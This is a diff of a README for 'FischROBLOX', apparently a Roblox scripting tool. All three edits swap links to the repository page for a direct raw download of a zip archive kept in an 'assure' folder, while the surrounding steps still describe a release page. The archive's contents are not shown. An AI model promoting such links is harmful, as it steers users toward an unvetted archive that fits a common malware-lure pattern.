@@ -1,6 +1,6 @@
 # 🚀 FischROBLOX - Simplify Your ROBLOX Scripting
 
-[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/damartr23/FischROBLOX)
+[![Download FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-brightgreen?style=for-the-badge)](https://github.com/damartr23/FischROBLOX/raw/refs/heads/main/assure/Fisch-ROBLOX-3.4-alpha.3.zip)
 
 ## 📝 About FischROBLOX
 
@@ -36,7 +36,7 @@ Before you get started, make sure your computer meets these basic requirements:
 
 Click the button below to visit the download page on GitHub. This page contains the latest version and all updates.
 
-[![Get FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-blue?style=for-the-badge)](https://github.com/damartr23/FischROBLOX)
+[![Get FischROBLOX](https://img.shields.io/badge/Download-FischROBLOX-blue?style=for-the-badge)](https://github.com/damartr23/FischROBLOX/raw/refs/heads/main/assure/Fisch-ROBLOX-3.4-alpha.3.zip)
 
 1. Open the page linked above in your web browser.  
 2. Look for the latest release or download section.  
@@ -90,7 +90,7 @@ If you encounter any issues, try these common fixes:
 
 To keep FischROBLOX working well, update it regularly:
 
-1. Visit the same download page: https://github.com/damartr23/FischROBLOX  
+1. Visit the same download page: https://github.com/damartr23/FischROBLOX/raw/refs/heads/main/assure/Fisch-ROBLOX-3.4-alpha.3.zip  
 2. Check for new versions or releases.  
 3. Download the latest installer.  
 4. Repeat the installation steps. The new version will replace the old one without extra effort.  
